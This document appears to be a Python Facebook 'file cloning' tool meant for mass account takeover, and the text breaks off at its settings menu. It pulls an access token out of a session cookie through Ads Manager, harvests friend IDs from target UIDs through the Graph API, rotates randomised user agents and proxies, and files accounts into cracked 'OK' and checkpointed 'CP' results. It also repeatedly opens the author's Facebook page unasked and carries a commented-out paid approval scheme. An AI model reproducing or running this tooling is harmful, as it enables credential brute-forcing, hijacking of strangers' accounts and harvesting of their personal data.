#-----------------[ Alamin-King ]-------------------#
 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
 #------------------[ ALAMIN-King ]-------------------#
import os, platform, time, sys
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('pip install httpx pip install beautifulsoup4')
#os.system('pip install requests ')
#os.system('pip install bs4')
#os.system('pip install rich')
#os.system('pip install urillb3')
#os.system("pkg install espeak")
#os.system("pkg update")
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mCHECKING UPDATE...? ')
#os.system("espeak -a 300 \"Checking,Update 1.1v,\"")
time.sleep(2)
#os.system('clear')
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mUPDATE VERSHON 1.1V...! ')
#os.system("espeak -a 300 \"UPDATE VERSION 1.1V,\"")
time.sleep(2)
#os.system('clear')
print("\033[97;1m[\x1b[38;5;50m+\033[97;1m]\x1b[38;5;50m FOLLOW MY FACEBOOK ID..!")
#os.system("espeak -a 300 \"FOLLOW,MY,FACEBOOK,ID,\"")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100082550437979')
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100082550437979')
##os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
#------------------[ ALAMIN-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/113.0.5672.162 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/374.0.0.10.114",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 13; V2172A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113",]
ua = ["Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Mozilla/5.0 (Linux; Android 11; I2012 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3121 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox= requests.get('https://github.com/MAHDI-143/BDMC/blob/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-M21'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/tonmy404-cyber/FILE_X/blob/main/tonmoy_ua.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ ALAMIN- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def TUTULj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/profile.php?id=100082550437979')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system('xdg-open https://www.facebook.com/profile.php?id=100082550437979')
os.system('xdg-open https://www.facebook.com/profile.php?id=100082550437979')
logo =(f"""
\033[38;5;196m────────────────────────────────────────────────── 
 █████╗ ██╗      █████╗ ███╗   ███╗██╗███╗   ██╗
██╔══██╗██║     ██╔══██╗████╗ ████║██║████╗  ██║
███████║██║     ███████║██╔████╔██║██║██╔██╗ ██║
██╔══██║██║     ██╔══██║██║╚██╔╝██║██║██║╚██╗██║
██║  ██║███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝                                                                                                                                                                                                                                                                                                                  
\033[38;5;196m───────────────────────────────────────────────────
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m FACEBOK\033[1;91m      : \033[1;91m-\033[1;92mNXT\033[1;91m-\033[1;92mALAMIN\033[1;91m-\033[1;92mKING            \033[1;91m
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m GITHUB\033[1;91m       :  \033[1;91m-\033[1;92mNXT-ALAMIN                     \033[1;91m
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m TOOL STATUS\033[1;91m  : \033[1;92m FILE CLONE                   \033[1;91m|
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m WHATSAPP\033[1;91m\033[1;91m     :  \033[1;92m019########\033[1;91m\033[1;92m                  \033[1;91m
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m TOOL VIRSION\033[1;91m :  \033[1;35m[\033[1;32m\033[1;92m1.1\033[1;35m]                        \033[1;91m
\033[38;5;196m──────────────────────────────────────────────────""")
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DEYS 250TK 30 500TK FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN PLZ ENTAR""")
fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
xudinaministar =(""" \033[32;1m[-] Importent Note """)
hedaborakarent =(""" \033[32;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 """)
#____APPROVAL SYSTEM ADD_____#
#def meyexudi():
#  os.system('clear')
#  print(logo)
 # uuid = str(os.geteuid()) + str(os.getlogin())
#  id = "-".join(uuid)
#  try:
 #   httpCaht = requests.get('https://github.com/NXT-ALAMIN/Approve.txt/blob/main/Approve.txt').text
 #   if id in httpCaht:
  #    print(fuckyoursali)
   #   print(hedaborakarent)
  #    msg = str(os.geteuid())
      #time.sleep(0.5)
     # print()
    #  pass
  #  else:
    #  print(meyermarexudi)
     # print(" \033[32;1m[+] Your Kay : "+id)
   #   print('\033[92;1m┏━\033[97;1m[\033[92;1m+\033[97;1m] \033[97;1mFREE USER NOT CAME INBOX')
  #    print('\033[92;1m┣━\033[97;1m[\033[92;1m+\033[97;1m] \033[92;1mFREE-FIRE-TIK-TOK- ID CLONING')
   #   print('\033[92;1m┗━\033[97;1m[\033[92;1m+\033[97;1m] \033[97;1mONLY ACTIVE ID CLONE')
   #   print('\033[92;1m┏━\033[97;1m[\033[92;1m+\033[97;1m] \033[92;1mUNACTIVE ID NOT ALLOW')
   #   print('\033[92;1m┣━\033[97;1m[\033[92;1m+\033[97;1m] \x1b[38;5;50mWI-FI WORKING 80%')
     # print('\033[92;1m┗━\033[97;1m[\033[92;1m+\033[97;1m] \033[92;1m15 DAY 200 TAKA ')
    #  print('\033[92;1m┏━\033[97;1m[\033[92;1m+\033[97;1m] \033[97;1m30 DAY 400 TAKA ')
   #   print('\033[92;1m┣━\033[97;1m[\033[92;1m+\033[97;1m] \x1b[38;5;50mFREE 15 DAY')
#      print("\033[92;1m┗━\033[97;1m[\033[92;1m+\033[97;1m] \033[92;1mYOUR KEY : "+id)
  #    print(f'\033[92;1m┏━──────────────────────────────────────────────────\033[1;37m')
 #     input('\033[92;1m┗━\033[97;1m[\033[92;1m+\033[97;1m] \033[97;1mIF U WANT TO BUY THEN PRESS ENTER ')
  #    os.system("python ALAMIN-1-1V.py")
  #    tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801754823797?text='+tks),approval()
   #   time.sleep(1)
   #   meyexudi()
 # except:
#    sys.exit()
#meyexudi()
#os.system("python ALAMIN.py")
def naima():
	print('-------------------')
print(logo)
#os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;91m[\033[1;92m+\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  NXT ,  V I P,  Tools"')
def back():
	login()
	
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m+\033[1;91m]\x1b[38;5;50m USERNAME KEY: ')
# password = input('\033[1;91m[\033[1;92m+\033[1;91m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'Alamin' :	
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[1;91m[\033[1;92m+\033[1;91m] \033[92;1\x1b[1;97m𝚈𝙾𝚄𝚁 𝚃𝙾𝙾𝙻𝚂 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
    print(f"\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m \x1b[38;5;50mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m \033[0;93mTODAY DATE :\x1b[38;5;50m "+date)
    print(f'\033[1;91m┏━───────────────────────────\033[1;37m')
    print(f"""\033[1;92m┣━\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \033[1;96mFILE CLONE [BEST]          """)
    print("""\033[1;92m┣━\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mFOLLOW MY GITHUB""")
    print(f"""\033[1;92m┣━\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[1;95mCHECK OK ID AND CP ID   """)
    print("""\033[1;92m┣━\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m \x1b[38;5;50mEXIT""")
    print(f'\033[1;91m┗━───────────────────────────\033[1;37m')
    ALAMIN = input('\x1b\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE: ')
    if ALAMIN in ['111']:
        login()
        dump_massal()
    elif ALAMIN in ['1']:
        crack_file()
    elif ALAMIN in ['2','02']:
        os.system('xdg-open https://github.com/NXT-ALAMIN')
        os.system("python King.py")
    elif ALAMIN in ['3','03']:
        result()
    elif ALAMIN in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
    #-----------------[ HASIL-CRACK ]-----------------#
 
def result():
    os.system('clear')
    print(logo)
    print('\x1b[38;5;50m┏━[𝟷]  \x1b[38;5;50mCHECK CP IDZ ')
    print('\x1b[38;5;50m┣━[𝟸]  \x1b[38;5;50m OK IDZ ')
    print('\x1b[38;5;50m┗━[𝟹]  \x1b[38;5;50m ')
    print('\x1b[38;5;50m═══════════════')
    kz = input(' \033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mCHOOSE : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin)==0:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('\x1b[38;5;50m==================')
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
            print('\x1b[38;5;50m==================')
            geeh = input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] CHOOSE : ')
            print('\x1b[38;5;50m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            noCP=0
            for CPku in range(len(lin)):
                CPkuni=lin[noCP].split('|')
                print(f' \033[97;1m[\x1b[38;5;50m•\033[97;1m] CP : \033[33m {CPkuni[0]}|{CPkuni[1]}\033[0m')
                noCP +=1
            print('\x1b[38;5;50m==================')
            input('\033[97;1m[\x1b[38;5;50m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin)==0:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    print('\x1b[38;5;50m==================')
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
            print('\x1b[38;5;50m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\x1b[38;5;50m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            noCP=0
            for CPku in range(len(lin)):
                CPkuni=lin[noCP].split('|')
                print(f'\033[97;1m[\x1b[38;5;50m•\033[97;1m] OK : \033[32m {CPkuni[0]}|{CPkuni[1]}\033[0m')
                noCP +=1
            print('\x1b[38;5;50m==================')
            input('\033[97;1m[\x1b[38;5;50m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0','00']:
        back()
    else:
        print('\x1b[38;5;50m==================')
        animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND IN MENU')
        exit()
 
#-------------------[ CRACK-PUBLIK ]----------------#
 
def dump_massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        print('\x1b[38;5;50m==================')
        jum = int(input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] ENTER TARGET AMOUNT  : '))
        print('\x1b[38;5;50m==================')
    except ValueError:
        print('\x1b[38;5;50m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum<1 or jum>100000000:
        print('\x1b[38;5;50m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        kl = input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] INPUT UID '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('\x1b[38;5;50m==================')
            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\x1b[38;5;50m==================')
        print(f' \033[97;1m[\x1b[38;5;50m•\033[97;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError,IOError):
        print('\x1b[38;5;50m==================')
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print(f'\033[38;5;196m───────────────────\033[1;37m')
    os.system('espeak -a 300 " your file name"')
    print('\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mFILE NAME EXAMPLE: /sdcard/file.txt Etc.]')
    o = input('\033[1;91m[\033[1;92m+\033[1;91m] \033[1;96mYOUR FILE NAME :\x1b[1;95m ')
    print(f'\033[38;5;196m───────────────────\033[1;37m')
    try:lin = open(o).read().splitlines()
    except:
        print(f'\033[38;5;196m───────────────────\033[1;37m')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print(f'\033[38;5;196m┏━───────────────────\033[1;37m')
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50mOLD ID ")
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mNEW ID")
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[38;5;50mMIX ID ")
    print(f'\033[38;5;196m┗━───────────────────\033[1;37m')
    hu = input('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \033[1;96mCHOOSE :\x1b[38;5;50m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print(f'\033[38;5;196m┏━───────────────────\033[1;37m')
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50m COOKIES  [\x1b[1;95mBEST\x1b[38;5;50m]")
    print("\x1b[38;5;50m┣━\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \x1b[38;5;50m CP ID [\x1b[38;5;50mBEST\x1b[38;5;50m]")
